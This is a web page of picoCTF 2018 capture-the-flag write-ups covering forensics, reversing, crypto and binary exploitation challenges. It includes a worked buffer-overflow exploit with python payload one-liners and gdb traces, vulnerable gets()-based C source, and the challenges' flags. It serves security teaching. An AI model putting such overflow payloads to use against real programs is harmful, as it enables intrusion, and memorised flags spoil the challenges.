small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>$ file ext-super-magic.img
ext-super-magic.img: data

$ debugfs ext-super-magic.img
debugfs 1.44.1 (24-Mar-2018)
Checksum errors in superblock!  Retrying...
ext-super-magic.img: Bad magic number in super-block while opening filesystem
</pre></table></code></div></div><p>Ok, so there is a bad magic number in the superblock. We look up what the magic<br /> number for the superblock should be <a href="https://wiki.osdev.org/Ext2#Superblock">here</a></p><p>We need to write the value <code class="language-plaintext highlighter-rouge">0xef53</code> at bytes 56 and 57 of the superblock. It also says the superblock always<br /> starts 1024 bytes from the start (<code class="language-plaintext highlighter-rouge">0x400</code>). So we open the .img file in a hex editor, and change the<br /> bytes at position (<code class="language-plaintext highlighter-rouge">0x438</code>) to <code class="language-plaintext highlighter-rouge">0xef53</code> in little endian format:</p><p><img src="writeupfiles/ext-super-magic-ss.jpg" alt="" /></p><p>Let’s see if it worked:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ file ext-super-magic-fixed.img
ext-super-magic-fixed.img: Linux rev 1.0 ext2 filesystem data (mounted or unclean), UUID=f2b57e6b-c9bc-4026-932f-03d8e69575db (large files)
</pre></table></code></div></div><p>whoo! it recognizes it as a valid file system, let’s try to mount it:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ mkdir tst
$ sudo mount ext-super-magic-fixed.img tst
</pre></table></code></div></div><p>The mounted volume contains a bunch of images, including<br /> one named <code class="language-plaintext highlighter-rouge">flag.jpg</code> which contains our flag:</p><p><img src="writeupfiles/ext-super-magic-flag.jpg" alt="" /></p><h2> Flag</h2><code> picoCTF{a7DB29eCf7dB9960f0A19Fdde9d00Af0} </code><hr><h1 id="forensics-250-lying-out"> Forensics 250: Lying out <a href="/CTF-writeups-public/writeups/PicoCTF_2018/49-forensics-250-lying-out.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong><br /> Some odd <a href="./writeupfiles/traffic.png">traffic</a> has been detected on the network, can you identify it? More info here. Connect with nc 2018shell1.picoctf.com 50875 to help us answer some questions.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>You'll need to consult the file `traffic.png` to answer the following questions.
Which of these logs have significantly higher traffic than is usual for their time of day? You can see usual traffic on the attached plot. There may be multiple logs with higher than usual traffic, so answer all of them! Give your answer as a list of `log_ID` values separated by spaces. For example, if you want to answer that logs 2 and 7 are the ones with higher than usual traffic, type 2 7.
    log_ID      time  num_IPs
0        0  00:00:00     9552
1        1  02:30:00    11573
2        2  06:00:00    10381
3        3  07:00:00    11674
4        4  07:00:00    10224
5        5  07:30:00    10966
6        6  16:00:00     9685
7        7  17:45:00    15875
8        8  18:00:00    11889
9        9  19:15:00    11935
10      10  19:30:00    11191
11      11  20:30:00     9952
12      12  20:45:00     9898
13      13  22:45:00    11609
1 3 7 13
Correct!
Great job. You've earned the flag: picoCTF{w4y_0ut_ff5bd19c}
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{w4y_0ut_ff5bd19c} </code><hr><h1 id="cryptography-250-safe-rsa"> Cryptography 250: Safe RSA <a href="/CTF-writeups-public/writeups/PicoCTF_2018/50-cryptography-250-safe-rsa.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2> Flag</h2><code> picoCTF{e_w4y_t00_sm411_81b6559f} </code><hr><h1 id="web-exploitation-250-the-vault"> Web Exploitation 250: The Vault <a href="/CTF-writeups-public/writeups/PicoCTF_2018/51-web-exploitation-250-the-vault.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2> Flag</h2><code> picoCTF{w3lc0m3_t0_th3_vau1t_e4ca2258} </code><hr><h1 id="forensics-250-what-s-my-name"> Forensics 250: What’s My Name? <a href="/CTF-writeups-public/writeups/PicoCTF_2018/52-forensics-250-whats-my-name.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Chalenge</strong><br /> Say my name, say <a href="./writeupfiles/myname.pcap">my name.</a></p><p><strong>Solution</strong><br /> Open the pcap file in wireshark, use <code class="language-plaintext highlighter-rouge">dns</code> as a packet filter, we look in the response section and there’s a TXT record with the flag.</p><h2> Flag</h2><code> picoCTF{w4lt3r_wh1t3_2d6d3c6c75aa3be7f42debed8ad16e3b} </code><hr><h1 id="general-skills-250-absolutely-relative"> General Skills 250: absolutely relative <a href="/CTF-writeups-public/writeups/PicoCTF_2018/53-general-skills-250-absolutely-relative.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In a filesystem, everything is relative ¯_(ツ)_/¯. Can you find a way to get a flag from this program? You can find it in /problems/absolutely-relative_1_15eb86fcf5d05ec169cc417d24e02c87 on the shell server. Source.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>They provide the <a href="./writeupfiles/absoluterelative.c">source</a> of absolutely-relative, it checks for a file named <code class="language-plaintext highlighter-rouge">./permission.txt</code> with the contents <code class="language-plaintext highlighter-rouge">yes</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>hxr@pico-2018-shell-1:~$ echo -n 'yes'  &gt; permission.txt
hxr@pico-2018-shell-1:~$ /problems/absolutely-relative_1_15eb86fcf5d05ec169cc417d24e02c87/absolutely-relative
You have the write permissions.
picoCTF{3v3r1ng_1$_r3l3t1v3_a97be50e}
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{3v3r1ng_1$_r3l3t1v3_a97be50e} </code><hr><h1 id="reversing-250-assembly-2"> Reversing 250: assembly-2 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/54-reversing-250-assembly-2.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>What does <code class="language-plaintext highlighter-rouge">asm2(0x7,0x28)</code> return? Submit the flag as a hexadecimal value (starting with <code class="language-plaintext highlighter-rouge">0x</code>).</p><p>NOTE: Your submission for this question will NOT be in the normal flag format.<br /> Source located in the directory at <code class="language-plaintext highlighter-rouge">/problems/assembly-2_4_f8bfecf223768f4cac035751390ea590</code>.</p><pre><code class="language-asm">.intel_syntax noprefix
.bits 32

.global asm2

asm2:
	push	ebp
	mov	ebp,esp
	sub	esp,0x10
	mov	eax,DWORD PTR [ebp+0xc]
	mov	DWORD PTR [ebp-0x4],eax
	mov	eax,DWORD PTR [ebp+0x8]
	mov	DWORD PTR [ebp-0x8],eax
	jmp	part_b
part_a:
	add	DWORD PTR [ebp-0x4],0x1
	add	DWORD PTR [ebp+0x8],0x76
part_b:
	cmp	DWORD PTR [ebp+0x8],0xa1de
	jle	part_a
	mov	eax,DWORD PTR [ebp-0x4]
	mov	esp,ebp
	pop	ebp
	ret
</code></pre><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Let’s manually walk through the code and write down what happens:</p><pre><code class="language-asm">.intel_syntax noprefix
.bits 32

.global asm2

; call: asm2(0x7,0x28)

asm2:
	push	ebp
	mov	ebp,esp
	sub	esp,0x10
	mov	eax,DWORD PTR [ebp+0xc]     ; eax = 0x28
	mov	DWORD PTR [ebp-0x4],eax     ; var1 = 0x28
	mov	eax,DWORD PTR [ebp+0x8]     ; eax = 0x7
	mov	DWORD PTR [ebp-0x8],eax     ; var2 = 0x7
	jmp	part_b                      ; jump to part_b
part_a:
	add	DWORD PTR [ebp-0x4],0x1         ; var1 += 1
	add	DWORD PTR [ebp+0x8],0x76        ; var2 += 0x76
part_b:
	cmp	DWORD PTR [ebp+0x8],0xa1de  ; var2 &gt; 0xa1de?  Y: return var1
	jle	part_a                      ;                 N: add x076 to var2 and 1 to var1 (part_a)
	mov	eax,DWORD PTR [ebp-0x4]     ; return var1
	mov	esp,ebp
	pop	ebp
	ret
</code></pre><p>so in pseudo code this is:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="n">count</span> <span class="o">=</span> <span class="mh">0x28</span>
<span class="n">num</span> <span class="o">=</span> <span class="mh">0x7</span>

<span class="k">while</span> <span class="n">num</span> <span class="o">&lt;</span> <span class="mh">0xa1de</span><span class="p">:</span>
   <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
   <span class="n">num</span> <span class="o">+=</span> <span class="mh">0x76</span>

<span class="k">return</span> <span class="n">count</span>

<span class="c1"># 0x28 + (0xa1de-0x7)/0x76 = 0x188
</span></pre></table></code></div></div><h2> Flag</h2><code> unsolved </code><hr><h1 id="binary-exploitation-250-buffer-overflow-2"> Binary Exploitation 250: buffer overflow 2 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/55-binary-exploitation-250-buffer-overflow-2.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong><br /> Alright, this time you’ll need to control some arguments. Can you get the flag from this program? You can find it in /problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa on the shell server. <a href="./writeupfiles/vuln-buff-overflow-2.c">Source.</a></p><p><strong>Solution</strong><br /> The hint suggests</p><blockquote><p>Try using gdb to print out the stack once you write to it!</p></blockquote><p>Which is useful. First attempted to find out what was necessary to overwrite the return pointer and segfault, ‘107 * a’ was just before there. Opened up gdb:</p><p>Looking at the dump of vuln, it is suggested to me that we should want to control ebp (to be <code class="language-plaintext highlighter-rouge">0xdeadbeefdeadcode</code>) + the return (to be <code class="language-plaintext highlighter-rouge">0x080485cb</code>)</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>080485cb &lt;win&gt;:
 ...
 804861d:       81 7d 08 ef be ad de    cmpl   $0xdeadbeef,0x8(%ebp)
 8048624:       75 1a                   jne    8048640 &lt;win+0x75&gt;
 8048626:       81 7d 0c de c0 ad de    cmpl   $0xdeadc0de,0xc(%ebp)
 804862d:       75 14                   jne    8048643 &lt;win+0x78&gt;
</pre></table></code></div></div><p>After much experimentation remembered how metasploit does it, by inserting the alphabet and mapping that back to points that are interesting to control.</p><p>We’ll debug this locally to start with for convenience. Touch a <code class="language-plaintext highlighter-rouge">flag.txt</code> and fill with a fake ‘flag’ that you’ll ‘discover’.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
</pre><td class="rouge-code"><pre>$ python -c "print('a' * 112 + 'ABCDEFGHIJKLMNOPQRSTUVWXYZ')" &gt; tmp
$ echo "picoCTF{fake_flag}" &gt; flag.txt
$ gdb writeupfiles/vuln-buff-overflow-2
...
(gdb) break vuln
Breakpoint 1 at 0x804864c
(gdb) disas
Dump of assembler code for function vuln:
   0x08048646 &lt;+0&gt;:     push   ebp
   0x08048647 &lt;+1&gt;:     mov    ebp,esp
   0x08048649 &lt;+3&gt;:     sub    esp,0x78
=&gt; 0x0804864c &lt;+6&gt;:     sub    esp,0xc
   0x0804864f &lt;+9&gt;:     lea    eax,[ebp-0x6c]
   0x08048652 &lt;+12&gt;:    push   eax
   0x08048653 &lt;+13&gt;:    call   0x8048430 &lt;gets@plt&gt;
   0x08048658 &lt;+18&gt;:    add    esp,0x10
   0x0804865b &lt;+21&gt;:    sub    esp,0xc
   0x0804865e &lt;+24&gt;:    lea    eax,[ebp-0x6c]
   0x08048661 &lt;+27&gt;:    push   eax
   0x08048662 &lt;+28&gt;:    call   0x8048460 &lt;puts@plt&gt;
   0x08048667 &lt;+33&gt;:    add    esp,0x10
   0x0804866a &lt;+36&gt;:    nop
   0x0804866b &lt;+37&gt;:    leave
   0x0804866c &lt;+38&gt;:    ret
End of assembler dump.
(gdb) break *0x0804866c
Haltepunkt 2 at 0x804866c
(gdb) continue
Continuing.
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaABCDEFGHIJKLMNOPQRSTUVWXYZ

Breakpoint 2, 0x0804866c in vuln ()
(gdb) disas
Dump of assembler code for function vuln:
   0x08048646 &lt;+0&gt;:     push   ebp
   0x08048647 &lt;+1&gt;:     mov    ebp,esp
   0x08048649 &lt;+3&gt;:     sub    esp,0x78
   0x0804864c &lt;+6&gt;:     sub    esp,0xc
   0x0804864f &lt;+9&gt;:     lea    eax,[ebp-0x6c]
   0x08048652 &lt;+12&gt;:    push   eax
   0x08048653 &lt;+13&gt;:    call   0x8048430 &lt;gets@plt&gt;
   0x08048658 &lt;+18&gt;:    add    esp,0x10
   0x0804865b &lt;+21&gt;:    sub    esp,0xc
   0x0804865e &lt;+24&gt;:    lea    eax,[ebp-0x6c]
   0x08048661 &lt;+27&gt;:    push   eax
   0x08048662 &lt;+28&gt;:    call   0x8048460 &lt;puts@plt&gt;
   0x08048667 &lt;+33&gt;:    add    esp,0x10
   0x0804866a &lt;+36&gt;:    nop
   0x0804866b &lt;+37&gt;:    leave
=&gt; 0x0804866c &lt;+38&gt;:    ret
End of assembler dump.
(gdb) p/x $esp
$1 = 0xffffcbdc
(gdb) p/x *((int)$esp)
$2 = 0x44434241
</pre></table></code></div></div><p>We’ll return to whatever is in $esp, so we just need to overwrite ABCD with the<br /> address we’d like to return to. We know we need to jump to <code class="language-plaintext highlighter-rouge">win</code>, we can find<br /> the address via objdump or just running <code class="language-plaintext highlighter-rouge">disas win</code> in gdb and copying the<br /> first byte.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ python -c "print('a' * 112 + '\xcb\x85\x04\x08' + 'EFGHIJKLMNOPQRSTUVWXYZ')" &gt; tmp
</pre></table></code></div></div><p>This time we know we’ll enter the <code class="language-plaintext highlighter-rouge">win</code> function so we can just break there:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre>(gdb) break win
Haltepunkt 1 at 0x80485d1
(gdb) run &lt; tmp
Starting program: writeupfiles/vuln-buff-overflow-2 &lt; tmp
Please enter your string:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaEFGHIJKLMNOPQRSTUVWXYZ

Breakpoint 1, 0x080485d1 in win ()
(gdb) disas
Dump of assembler code for function win:
   0x080485cb &lt;+0&gt;:     push   ebp
   0x080485cc &lt;+1&gt;:     mov    ebp,esp
   0x080485ce &lt;+3&gt;:     sub    esp,0x58
=&gt; 0x080485d1 &lt;+6&gt;:     sub    esp,0x8
   0x080485d4 &lt;+9&gt;:     push   0x8048750
   0x080485d9 &lt;+14&gt;:    push   0x8048752
   0x080485de &lt;+19&gt;:    call   0x80484a0 &lt;fopen@plt&gt;
   0x080485e3 &lt;+24&gt;:    add    esp,0x10
   0x080485e6 &lt;+27&gt;:    mov    DWORD PTR [ebp-0xc],eax
   0x080485e9 &lt;+30&gt;:    cmp    DWORD PTR [ebp-0xc],0x0
   0x080485ed &lt;+34&gt;:    jne    0x8048609 &lt;win+62&gt;
   0x080485ef &lt;+36&gt;:    sub    esp,0xc
   0x080485f2 &lt;+39&gt;:    push   0x804875c
   0x080485f7 &lt;+44&gt;:    call   0x8048460 &lt;puts@plt&gt;
   0x080485fc &lt;+49&gt;:    add    esp,0x10
   0x080485ff &lt;+52&gt;:    sub    esp,0xc
   0x08048602 &lt;+55&gt;:    push   0x0
   0x08048604 &lt;+57&gt;:    call   0x8048470 &lt;exit@plt&gt;
   0x08048609 &lt;+62&gt;:    sub    esp,0x4
   0x0804860c &lt;+65&gt;:    push   DWORD PTR [ebp-0xc]
   0x0804860f &lt;+68&gt;:    push   0x40
   0x08048611 &lt;+70&gt;:    lea    eax,[ebp-0x4c]
   0x08048614 &lt;+73&gt;:    push   eax
   0x08048615 &lt;+74&gt;:    call   0x8048440 &lt;fgets@plt&gt;
   0x0804861a &lt;+79&gt;:    add    esp,0x10
   0x0804861d &lt;+82&gt;:    cmp    DWORD PTR [ebp+0x8],0xdeadbeef
   0x08048624 &lt;+89&gt;:    jne    0x8048640 &lt;win+117&gt;
   0x08048626 &lt;+91&gt;:    cmp    DWORD PTR [ebp+0xc],0xdeadc0de
   0x0804862d &lt;+98&gt;:    jne    0x8048643 &lt;win+120&gt;
   0x0804862f &lt;+100&gt;:   sub    esp,0xc
   0x08048632 &lt;+103&gt;:   lea    eax,[ebp-0x4c]
   0x08048635 &lt;+106&gt;:   push   eax
   0x08048636 &lt;+107&gt;:   call   0x8048420 &lt;printf@plt&gt;
   0x0804863b &lt;+112&gt;:   add    esp,0x10
   0x0804863e &lt;+115&gt;:   jmp    0x8048644 &lt;win+121&gt;
   0x08048640 &lt;+117&gt;:   nop
   0x08048641 &lt;+118&gt;:   jmp    0x8048644 &lt;win+121&gt;
   0x08048643 &lt;+120&gt;:   nop
   0x08048644 &lt;+121&gt;:   leave
   0x08048645 &lt;+122&gt;:   ret
End of assembler dump.
</pre></table></code></div></div><p>Let’s break right before the comparisons happen just in case ebp is modified anywhere.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>(gdb) break *0x0804861a
Haltepunkt 2 at 0x804861a
(gdb) continue
Continuing.

Breakpoint 2, 0x0804861a in win ()
</pre></table></code></div></div><p>And looking into those we see:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>(gdb) p/x *((int)$ebp + 0x8)
$1 = 0x4c4b4a49  # LKJI
(gdb) p/x *((int)$ebp + 0xc)
$2 = 0x504f4e4d  # PONM
</pre></table></code></div></div><p>So we’ll just overwrite those now:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>$ python -c "print('a' * 112 + '\xcb\x85\x04\x08' + 'EFGH' + '\xef\xbe\xad\xde\xde\xc0\xad\xde')" | ./writeupfiles/vuln-buff-overflow-2
Please enter your string:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭ
picoCTF{test flag}
[1]    12928 done                              python -c  |
       12929 segmentation fault (core dumped)  ./writeupfiles/vuln-buff-overflow-2
</pre></table></code></div></div><p>So that works perfectly</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>$ python -c "print('a' * 112 + '\xcb\x85\x04\x08' + 'EFGH' + '\xef\xbe\xad\xde\xde\xc0\xad\xde')" | ./vuln
Please enter your string:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭ
picoCTF{addr3ss3s_ar3_3asy1b78b0d8}  Segmentation fault (core dumped)
</pre></table></code></div></div><p>Which is just what we wanted</p><h2> Flag</h2><code> picoCTF{addr3ss3s_ar3_3asy1b78b0d8} </code><hr><h1 id="cryptography-250-caesar-cipher-2"> Cryptography 250: caesar cipher 2 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/56-cryptography-250-caesar-cipher-2.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Can you help us decrypt <a href="writeupfiles/ciphertext2">this message</a>? We believe it is a form of a caesar cipher.</p><p>You can find the ciphertext in <code class="language-plaintext highlighter-rouge">/problems/caesar-cipher-2_3_4a1aa2a4d0f79a1f8e9a29319250740a</code> on the shell server.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>4-'3evh?'c)7%t#e-r,g6u#.9uv#%tg2v#7g'w6gA
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Looks like caesar shift cipher but with a larger alphabet. Since we know the flag<br /> format, we can deduce the shift amount (e.g. <code class="language-plaintext highlighter-rouge">4</code> should become <code class="language-plaintext highlighter-rouge">p</code>). The most likely candidate is the ascii table</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">string</span>

<span class="n">alphabet</span><span class="o">=</span><span class="sh">""</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span><span class="mi">126</span><span class="p">):</span>
    <span class="n">alphabet</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="n">alphabet</span><span class="p">)</span>

<span class="n">shift</span><span class="o">=</span><span class="n">alphabet</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">'</span><span class="s">p</span><span class="sh">'</span><span class="p">)</span><span class="o">-</span><span class="n">alphabet</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">shift</span><span class="p">)</span>

<span class="n">ct</span><span class="o">=</span><span class="sh">"</span><span class="s">4-</span><span class="sh">'</span><span class="s">3evh?</span><span class="sh">'</span><span class="s">c)7%t#e-r,g6u#.9uv#%tg2v#7g</span><span class="sh">'</span><span class="s">w6gA</span><span class="sh">"</span>

<span class="n">pt</span><span class="o">=</span><span class="sh">''</span>
<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">ct</span><span class="p">:</span>
    <span class="n">pt</span> <span class="o">+=</span> <span class="n">alphabet</span><span class="p">[</span> <span class="p">(</span><span class="n">alphabet</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">+</span><span class="n">shift</span><span class="p">)</span><span class="o">%</span><span class="nf">len</span><span class="p">(</span><span class="n">alphabet</span><span class="p">)</span> <span class="p">]</span>

<span class="nf">print</span><span class="p">(</span><span class="n">pt</span><span class="p">)</span>
</pre></table></code></div></div><p>And this outputs the flag for us</p><h2> Flag</h2><code> picoCTF{cAesaR_CiPhErS_juST_aREnT_sEcUrE} </code><hr><h1 id="binary-exploitation-250-got-2-learn-libc"> Binary Exploitation 250: got-2-learn-libc <a href="/CTF-writeups-public/writeups/PicoCTF_2018/57-binary-exploitation-250-got-2-learn-libc.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This <a href="writeupfiles/vuln3">program</a> gives you the address of some system calls. Can you get a shell?</p><p>You can find the program in <code class="language-plaintext highlighter-rouge">/problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee</code> on the shell server.</p><p><a href="writeupfiles">Source</a></p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span>
<span class="cp">#define BUFSIZE 148
#define FLAGSIZE 128
</span>
<span class="kt">char</span> <span class="n">useful_string</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/bin/sh"</span><span class="p">;</span> <span class="cm">/* Maybe this can be used to spawn a shell? */</span>


<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(){</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUFSIZE</span><span class="p">];</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Enter a string:"</span><span class="p">);</span>
  <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
